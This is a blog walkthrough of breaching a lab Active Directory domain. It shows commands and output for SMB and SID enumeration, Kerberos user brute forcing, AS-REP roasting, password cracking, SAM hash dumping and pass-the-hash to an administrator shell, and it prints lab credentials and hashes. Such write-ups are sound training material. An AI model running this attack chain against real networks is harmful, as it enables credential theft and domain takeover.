@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory I — b3nj1</title>
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark-dimmed.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="logo">b3nj1</a>
+  <div class="links">
+    <a href="../index.html">index</a>
+    <a href="../about.html">about</a>
+    <a href="../research/index.html">research</a>
+    <button class="switch-btn" id="dmBtn" onclick="toggleDM()">light</button>
+    <button class="switch-btn" onclick="switchTheme()">layout</button>
+  </div>
+</nav>
+
+<article>
+  <h1>Active Directory I</h1>
+  <div class="meta">Aug 29, 2021 / Windows</div>
+  <div class="body">
+    <p>In this article I use a basic methodology to breach an Active Directory, this article will be the first of a saga that will be oriented to AD walkthroughs.</p>
+<hr>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p><em>Ports:</em></p>
+<ul>
+<li>53/tcp  --&gt;  Simple DNS Plus</li>
+<li>88/tcp   --&gt;  kerberos-sec  Microsoft Windows Kerberos</li>
+<li>135/tcp  --&gt; Microsoft Windows RPC</li>
+<li>139/tcp --&gt; Microsoft Windows netbios-ssn</li>
+<li>389/tcp  --&gt; Microsoft Windows Active Directory LDAP </li>
+<li>445/tcp  --&gt;  microsoft-ds?</li>
+<li>464/tcp  --&gt;  kpasswd5?</li>
+<li>593/tcp  --&gt; Microsoft Windows RPC over HTTP 1.0</li>
+<li>636/tcp  --&gt;  tcpwrapped</li>
+<li>3268/tcp --&gt; Microsoft Windows Active Directory LDAP</li>
+</ul>
+<p><em>Domain:</em></p>
+<ul>
+<li>vulnnet-rst.local</li>
+</ul>
+<pre><code class="language-bash"># Nmap 7.91 scan initiated Sun Aug 29 19:47:38 2021 as: nmap -Pn -p53,88,135,139,389,445,464,593,636,3268 -sC -sV -oN Scanport-1 10.10.45.157
+Nmap scan report for 10.10.45.157
+Host is up (0.22s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-29 23:47:46Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
+Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-08-29T23:48:03
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 29 19:48:43 2021 -- 1 IP address (1 host up) scanned in 64.61 seconds
+</code></pre>
+<h3>Lightweight Directory Access Protocol</h3>
+<p><a href="https://www.profesionalreview.com/2019/01/05/ldap/">LDAP</a> it is important to always scan ldap because it could have names, surnames and addresses that are written in DTMF map format although in this specific case we will not use it, here I leave the tool (We could also scan ldap with nmap):</p>
+<pre><code class="language-bash">ldapsearch -x -h 10.10.45.157
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+</code></pre>
+<h3>SMB</h3>
+<p>At this point, when faced with an AD, the ideal would be to gather as much information as possible. <a href="https://www.educba.com/what-is-smb/">(SMB)</a>). </p>
+<p>In this opportunity we make use of the smbclient tool but we have several alternatives such as the <a href="https://github.com/ShawnDEvans/smbmap">SMBMap</a> and the <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>:</p>
+<ul>
+<li>-N(--no-pass) this parameter suppresses the normal password message.</li>
+<li>-L(--list) this parameter allows you to see which folders are available on a server.</li>
+</ul>
+<pre><code class="language-bash">smbclient -L //10.10.45.157 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
+        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
+SMB1 disabled -- no workgroup available
+</code></pre>
+<p>When we see which folders are shared we proceed to download all the content they contain in search of possible users.<a href="https://www.computerhope.com/unix/smbclien.htm">recurse, prompt, mget</a>:</p>
+<pre><code class="language-bash">smbclient //10.10.45.157/VulnNet-Business-Anonymous
+Enter WORKGROUP\b3nj1&#39;s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; recurse on 
+smb: \&gt; prompt off
+smb: \&gt; mget *
+getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
+<pre><code class="language-bash">smbclient //10.10.45.157/VulnNet-Enterprise-Anonymous
+Enter WORKGROUP\b3nj1&#39;s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; recurse on
+smb: \&gt; prompt off 
+smb: \&gt; mget *
+getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \&gt; 
+</code></pre>
+<h3>Lookupsid</h3>
+<p>Another alternative to enumerate users would be through the <a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">rpc</a> protocol which basically allows me to perform bruteforcing of Windows SIDs to identify users / groups on the remote target:</p>
+<pre><code class="language-bash">impacket-lookupsid vulnnet-rst.local/guest:@10.10.45.157
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[] Brute forcing SIDs at 10.10.45.157
+[] StringBinding ncacn_np:10.10.45.157[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: VULNNET-RST\Administrator (SidTypeUser)
+501: VULNNET-RST\Guest (SidTypeUser)
+502: VULNNET-RST\krbtgt (SidTypeUser)
+512: VULNNET-RST\Domain Admins (SidTypeGroup)
+513: VULNNET-RST\Domain Users (SidTypeGroup)
+514: VULNNET-RST\Domain Guests (SidTypeGroup)
+515: VULNNET-RST\Domain Computers (SidTypeGroup)
+516: VULNNET-RST\Domain Controllers (SidTypeGroup)
+517: VULNNET-RST\Cert Publishers (SidTypeAlias)
+518: VULNNET-RST\Schema Admins (SidTypeGroup)
+519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
+520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
+521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
+522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
+525: VULNNET-RST\Protected Users (SidTypeGroup)
+526: VULNNET-RST\Key Admins (SidTypeGroup)
+527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
+553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
+571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
+572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
+1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
+1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
+1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+1105: VULNNET-RST\a-whitehat (SidTypeUser)
+1109: VULNNET-RST\t-skid (SidTypeUser)
+1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+1111: VULNNET-RST\j-leet (SidTypeUser)
+</code></pre>
+<h3>Wordlist</h3>
+<p>We look at the contents of each file for common patterns between files:<br><img src="/images_blog/img_vulnet_roasted/roasted_wordlist.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/131405007-45cb2bb0-c792-4dfa-a4a7-c50af0843537.png" alt="roasted_wordlist"></p>
+<p>In some files we find names, the idea would be to create a dictionary based on those names that we find to later use it.</p>
+<p>This script allows me to make a dictionary in a fast way:<br><a href="https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-wordlist-names.sh">Wordlist-Name</a></p>
+<pre><code class="language-bash">#!/bin/bash
+
+if [[ $ == &quot;-h&quot; || $# != 1 ]]; then
+echo &quot;Usage: ctf-wordlist-names names-file&quot;
+exit
+fi
+
+if [ -f formatted_name_wordlist.txt ]; then
+echo &quot;[!] formatted_name_wordlist.txt file already exist.&quot;
+exit 1
+fi
+
+cat $1 | while read line; do
+			firstname=$(echo $line | cut -d &#39; &#39; -f1 | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;)
+			lastname=$(echo $line | cut -d &#39; &#39; -f2 | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;)
+			echo &quot;$firstname.$lastname
+$(echo $firstname | cut -c1).$lastname
+$(echo $firstname | cut -c1)-$lastname
+$firstname$lastname
+$firstname-$lastname
+$(echo $firstname | cut -c1-3)$(echo $lastname | cut -c1-3)
+$(echo $firstname | cut -c1-3).$(echo $lastname | cut -c1-3)
+$(echo $firstname | cut -c1)$lastname
+$lastname$firstname
+$lastname-$firstname
+$lastname.$firstname
+$lastname$(echo $firstname | cut -c1)
+$lastname-$(echo $firstname | cut -c1)
+$lastname.$(echo $firstname | cut -c1)&quot; &gt;&gt; formatted_name_wordlist.txt
+done
+</code></pre>
+<p>We extract the names of all the files that we had extracted (Keep in mind that commonly in AD nomenclatures are used for the users):</p>
+<pre><code class="language-bash">cat users.txt
+Alexa Whitehat
+Jack Goldenhand
+Tony Skid
+Johnny Leet
+</code></pre>
+<p>We use this script to automate the part of creating the nomenclature for each user, just run the script, pass the list of users and ready this will create a list of usernames with different nomenclature that we can use for bruteforcing:<br><img src="/images_blog/img_vulnet_roasted/roasted_wordlist_format.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/131405038-80e9707b-7b3d-4e4c-aa81-4de55cb17044.png" alt="roasted_wordlist_format"></p>
+<h3>Kerbrute</h3>
+<p>We will check which users of our list are valid in the domain by means of a brute force attack using the Impacket library with the tool <a href="https://github.com/ropnop/kerbrute">kerbrute</a>.</p>
+<p><em>Use:</em></p>
+<ul>
+<li>--dc we place the ip of the domain controller.</li>
+<li>-d we place the complete domain.</li>
+</ul>
+<pre><code class="language-bash">kerbrute userenum --dc 10.10.45.157 -d vulnnet-rst.local formatted_name_wordlist.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/29/21 - Ronnie Flathers @ropnop
+
+2021/08/29 20:18:41 &gt;  Using KDC(s):
+2021/08/29 20:18:41 &gt;   10.10.45.157:88
+
+2021/08/29 20:18:41 &gt;  [+] VALID USERNAME:   j-goldenhand@vulnnet-rst.local
+2021/08/29 20:18:41 &gt;  [+] VALID USERNAME:   a-whitehat@vulnnet-rst.local
+2021/08/29 20:18:42 &gt;  [+] VALID USERNAME:   j-leet@vulnnet-rst.local
+2021/08/29 20:18:42 &gt;  [+] VALID USERNAME:   t-skid@vulnnet-rst.local
+2021/08/29 20:18:46 &gt;  Done! Tested 56 usernames (4 valid) in 5.397 seconds
+</code></pre>
+<h3>GetNPUsers</h3>
+<p>This script will attempt to enumerate and obtain TGTs for those users that have the &#39;No kerberos preauthentication required&#39; property set. (UF_DONT_REQUIRE_PREAUTH). <a href="https://www.aldeid.com/wiki/Impacket/GetNPUsers">Impacket/GetNPUsers</a> <a href="https://foxed.github.io/GetNPUsers/">GetNPUsers.py</a></p>
+<p>We can simply pass you the dictionary or we could do it this way, any way would be valid to meet the objective:</p>
+<pre><code class="language-bash">for u in $(cat diccionario.txt);do impacket-GetNPUsers vulnnet-rst.local/$u -request -no-pass -dc-ip 10.10.45.157; done
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for enterprise-core-vn
+[-] User enterprise-core-vn doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for a-whitehat
+[-] User a-whitehat doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for t-skid
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:397653e349e8aa321ca54c57cac83e8b$a539de770ec1456964fee7db0661866a35ab20195270d40e4856d9d983c4cd2dc36ba21e90ddeed1866c7fd5e8357630d2c37def9dd2f220e8ac540aa1fab2c159c0a4b6ce282ac3e6cf0b16b9869ceacd9c298048db8fa5a2e1d21b674742403edf5d90934b283552b3bd45f08ef6ff66da85a61aae7736b31a3c8a9e3bd66586fef3ad83124bedb0a4b54f057de94d327f9d1c1bf40e70a4e387ff6e2eed20ace26313cdf1b3db7a11f3eacd3d48b79a703c72ef18d9d06c3b7d001237689f5b9977545f6ce20c43f3c4c88a9500b49c1cb5f80c823021f843ce67fd7a80a29be76697d48b04f726334530c0f05488145f0da0fc8e
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for j-goldenhand
+[-] User j-goldenhand doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for j-leet
+[-] User j-leet doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+<h3>John The Ripper</h3>
+<p>Using john we are going to break the hash that we previously obtained with the enumeration to kerberos, in order to see the password in clear text:</p>
+<pre><code class="language-bash">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
+1g 0:00:00:12 DONE (2021-08-29 20:40) 0.07917g/s 251657p/s 251657c/s 251657C/s tj080790..tj071190
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p><em>Crendentials:</em></p>
+<ul>
+<li>t-skid</li>
+<li>tj072889*</li>
+</ul>
+<h3>CME</h3>
+<p>We have credentials the idea would be to check in which shared folder the user that we obtained has permission, this we can do it with:</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.45.157 -u &quot;t-skid&quot; -p &quot;tj072889*&quot; --shares
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] Enumerated shares
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  -----           -----------     ------
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  C$                              Default share
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
+</code></pre>
+<p>We see that we have access to IPC, NETLOGON and SYSVOL.</p>
+<p>Here is a module that I found interesting from cme <a href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus">spider_plus</a>.</p>
+<p>I also leave you all the available modules that <a href="https://www.infosecmatter.com/crackmapexec-module-library/">CrackMapExec Module Library</a> has.</p>
+<p>This one basically automates me to enter to each shared resource with this user, giving a little context this would be useful if we have many resources to enumerate:</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.45.157 -u &quot;t-skid&quot; -p &quot;tj072889*&quot; -M spider_plus
+[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named &#39;pylnk3&#39;
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
+SPIDER_P... 10.10.45.157    445    WIN-2BO8M1OE1M1  [*] Started spidering plus with option:
+SPIDER_P... 10.10.45.157    445    WIN-2BO8M1OE1M1  [*]        DIR: [&#39;print$&#39;]
+SPIDER_P... 10.10.45.157    445    WIN-2BO8M1OE1M1  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]
+SPIDER_P... 10.10.45.157    445    WIN-2BO8M1OE1M1  [*]       SIZE: 51200
+SPIDER_P... 10.10.45.157    445    WIN-2BO8M1OE1M1  [*]     OUTPUT: /tmp/cme_spider_plus
+</code></pre>
+<p>Here we see that in the NETLOGON shared resource there is a script, specifically a Microsoft VBScript:<br><img src="/images_blog/img_vulnet_roasted/roasted_spider_cme.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/131405072-bc33bae9-4d6a-4b91-aba6-be89127b2cbc.png" alt="roasted_spider_cme"></p>
+<p>We proceed to download the file to analyze it and look for useful information:</p>
+<pre><code class="language-bash">smbclient //10.10.45.157/NETLOGON -U t-skid
+Enter WORKGROUP\t-skid&#39;s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Mar 16 19:15:49 2021
+  ..                                  D        0  Tue Mar 16 19:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
+
+                8771839 blocks of size 4096. 4528907 blocks available
+smb: \&gt; get ResetPassword.vbs 
+getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+smb: \&gt; 
+</code></pre>
+<p>To give some context about this file <a href="https://www.taringa.net/+info/que-es-vbscript_12rc00">¿Qué es VBScript?</a>.</p>
+<p><img src="/images_blog/img_vulnet_roasted/roasted_vbs.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/131405093-a52517a0-646f-49c1-8085-c6c9b9eb6da3.png" alt="roasted_vbs"></p>
+<p>After analyzing the script I find unencrypted credentials of a valid user in the domain (The user a-whitehat was one of those extracted by kerbrute):</p>
+<pre><code class="language-bash">strUserNTName = &quot;a-whitehat&quot;
+strPassword = &quot;bNdKVkjv3RR9ht&quot;
+</code></pre>
+<p>I check if the credentials of this user that we get from the script is correct (This we can see with the + sign if it were the opposite it would give a -):</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.45.157 -u &quot;a-whitehat&quot; -p &quot;bNdKVkjv3RR9ht&quot;
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
+</code></pre>
+<p>At this point we could with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">impacket/psexec.py)</a> establish a shell since we have the permissions to do so (I know I have permissions by the (Pwn3d!) that tells me cme, this appears on the screen when the user is a local administrator) but the idea is to become administrator of the domain controller then for this we extract the <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">Security Account Manager</a> of the computer since we are local administrator:</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.45.157 -u &quot;a-whitehat&quot; -p &quot;bNdKVkjv3RR9ht&quot; --sam
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] Dumping SAM hashes
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ERROR:root:SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.
+SMB         10.10.45.157    445    WIN-2BO8M1OE1M1  [+] Added 3 SAM hashes to the database
+</code></pre>
+<h3>Wmiexec</h3>
+<p>We have the SAM of the machine, the idea would be to make <code>PassTheHash</code> to the administrator (This happens mostly when the domain administrator logs into a machine with his credentials), to do this we use the tool <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">impacket wmiexec.py</a><br><a href="https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash">Pass the Hash</a></p>
+<pre><code class="language-bash">impacket-wmiexec vulnnet-rst.local/administrator@10.10.45.157 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+vulnnet-rst\administrator
+</code></pre>
+<h3>Plus</h3>
+<p><a href="https://www.elladodelmal.com/2014/07/mitagacion-de-ataques-pass-hash-y-pass.html">Pass-the-Hash attack mitigation</a></p>
+<p align="center">
+<img src="https://tenor.com/view/madonna-prince-prince-tribute-purple-rain-purple-throne-gif-5492385.gif" width="350" height="350" />
+</p>
+  </div>
+  <div class="tags"><span class="tag">Active Directory</span>
+<span class="tag">AS-REP Roast</span>
+<span class="tag">Passthehashm</span>
+<span class="tag">walkthroughs</span></div>
+</article>
+<script>
+function switchTheme() { localStorage.setItem('layout','modern'); window.location.href = '../../modern/index.html'; }
+function toggleDM() { var d = document.documentElement; var c = d.getAttribute('data-theme'); var n = (c === 'light') ? 'dark' : 'light'; d.setAttribute('data-theme', n); document.getElementById('dmBtn').textContent = n === 'light' ? 'dark' : 'light'; localStorage.setItem('dm', n); }
+(function(){ var s = localStorage.getItem('dm') || 'dark'; if (s === 'light') { document.documentElement.setAttribute('data-theme','light'); document.getElementById('dmBtn').textContent = 'dark'; } })();
+</script>
+<footer>B3nj1 / 2026</footer>
+</body>
+</html>
